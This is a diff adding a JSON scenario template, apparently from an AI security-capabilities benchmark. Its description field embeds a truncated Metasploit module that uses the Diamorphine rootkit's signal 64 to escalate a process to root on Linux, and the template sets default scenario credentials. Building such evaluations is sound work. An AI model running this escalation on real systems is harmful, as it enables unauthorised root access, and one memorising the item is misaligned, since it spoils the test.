@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_48131",
+  "category": "A3_capabilities",
+  "attack_technique": "T1068",
+  "cwe": "CWE-266",
+  "description": "Linux privilege escalation: Diamorphine Rootkit - Signal Privilege Escalation (Metasploit)\n\nExploit source code (48131.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Diamorphine Rootkit Signal Privilege Escalation',\n      'Description'    => %q{\n        This module uses Diamorphine rootkit's privesc feature using signal\n        64 to elevate the privileges of arbitrary processes to UID 0 (root).\n\n        This module has been tested successfully with Diamorphine from `master`\n        branch (2019-10-04) on Linux Mint 19 kernel 4.15.0-20-generic (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'm0nad', # Diamorphine\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2013-11-07', # Diamorphine first public commit\n      'References'     =>\n        [\n          ['URL', 'https://github.com/m0nad/Diamorphine']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptInt.new('SIGNAL', [true, 'Diamorphine elevate signal', 64])\n    ]\n    register_advanced_options [\n      OptBool.new('ForceExploit', [false, 'Override check result', false]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def signal\n    datastore['SIGNAL'].to_s\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n    chmod path, 0755\n  end\n\n  def cmd_exec_elevated(cmd)\n    vprint_status \"Executing #{cmd} ...\"\n    res = cmd_exec(\"sh -c 'kill -#{signal} $$ && #{cmd}'\").to_s\n    vprint_line res unless res.blank?\n    res\n  end\n\n  def check\n    res = cmd_exec_elevated 'id'\n\n    if res.include?('invalid signal')\n      return CheckCode::Safe(\"Signal '#{signal}' is invalid\")\n    end\n\n    unless res.include?('uid=0')\n      return CheckCode::Safe(\"Diamorphine is not installed, or incorrect signal '#{signal}'\")\n    end\n\n    CheckCode::Vulnerable(\"Diamorphine is installed and configured to handle signal '#{signal}'.\")\n  end\n\n  def exploit\n    unless check == CheckCode::Vulnerable\n      unless datastore['ForceExploit']\n        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'\n      end\n      print_warning 'Target does not appear to be vulnerable'\n    end\n\n    if is_root?\n      unless datastore['F\n```",
+  "cve": "",
+  "exploitdb_id": "48131",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_48131",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
